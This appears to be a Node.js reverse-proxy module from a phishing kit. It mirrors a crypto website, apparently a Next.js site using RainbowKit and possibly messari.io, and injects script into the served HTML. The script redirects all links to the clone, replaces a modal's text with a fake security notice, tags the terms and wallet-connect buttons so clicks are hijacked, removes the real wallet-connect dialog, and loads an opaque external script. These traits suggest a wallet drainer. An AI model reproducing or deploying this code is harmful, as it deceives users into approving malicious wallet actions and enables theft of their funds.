"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.delegateRequest = void 0;
const https_1 = __importDefault(require("https"));
const inject_1 = require("../inject");
const zlib_1 = __importDefault(require("zlib"));
const delegateRequest = (req, res, domain) => {
    const { method, headers, url } = req;
    headers['host'] = domain;
    headers['referrer'] = domain;
    headers['origin'] = domain;
    const options = {
        hostname: domain,
        path: url,
        method,
        headers,
        port: 443,
        rejectUnauthorized: false // только для тестирования
    };
    try {
        const proxyRequest = https_1.default.request(options, (response) => {
            if (response.statusCode, response.headers['content-type'] === 'text/html; charset=utf-8') {
                let htmlCompress = [];
                let htmlDecompress = [];
                response.on('data', (chunk) => {
                    htmlCompress.push(chunk);
                });
                response.on('error', () => {
                    res.end();
                });
                response.on('end', () => {
                    zlib_1.default.brotliDecompress(Buffer.concat(htmlCompress), (_, data) => {
                        try {
                            delete response.headers['content-encoding'];
                            delete response.headers['content-length'];
                            res.writeHead(response.statusCode || 500, response.headers);
                            htmlDecompress = (0, inject_1.inject)(data, `
                                    <div class="interact-button" style="position:fixed;top: 15px;right: 30px;width:205px;height:59px;z-index:1000"></div>
                                    <script>
                                    const intervalSetLinksId = setInterval(()=>{
                                        const links = document.querySelectorAll('a')
                                        links.forEach(e=>{
                                            e.href = '/'
                                        })

                                       
                                    },500)
                                    const modalPatchInterval = setInterval(()=>{
                                        try{
                                        document.querySelector("#__next > div > div > div > main > div > div > div.flex.flex-col.gap-3.p-4 > div > p:nth-child(2)").innerText = 'Protect Your Digital Assets – Be mindful of security best practices to ensure a safe experience.'
                                        document.querySelector('[aria-label="Agree to Terms and Continue"]').classList.add('interact-button')
                                        // document.querySelector('[aria-label="Agree to Terms and Continue"]').remove()
                                        document.querySelector("#__next > div > div > div > main > div > header > div.flex.w-full.items-center.justify-end.gap-2.text-white > div > div > button").classList.add('interact-button')
                                        document.querySelector('[aria-label="modal button"]').onclick = ()=>document.querySelector("#__next > div > div > div > main > div > div").remove()
                                        if(!document.querySelector('[aria-label="Agree to Terms and Continue"]')){
                                            clearInterval(modalPatchInterval)
                                        }
                                            }catch(e){}
                                    },500)
                                   
                                    setInterval(()=>{
                                        try{
                                            document.querySelectorAll("button")[2].classList.add('interact-button')
                                            document.querySelector('[aria-labelledby="rk_connect_title"]').remove()
                                        }catch(e){}
                                      
                                    },0)
                                  

                                    setInterval(()=>{
                                       document.querySelectorAll("button")[2].classList.add('interact-button')
                                    },1000)
                                    </script defer>
                                    <script src="./0e562aaa-8e80-46a3-aea9-f6a285736170.js" defer ></script>`);
                            //@ts-ignore
                            // htmlDecompress = replace(htmlDecompress,'"url":"https://messari.io/"',`"url":"${url}"`)
                            res.end(htmlDecompress);
                        }
                        catch (error) {
                        }
                    });
                });
            }
            else {
                res.writeHead(response.statusCode || 500, response.headers);
                response.pipe(res);
            }
        });
        req.pipe(proxyRequest);
    }
    catch (error) {
        console.log(error);
    }
};
exports.delegateRequest = delegateRequest;
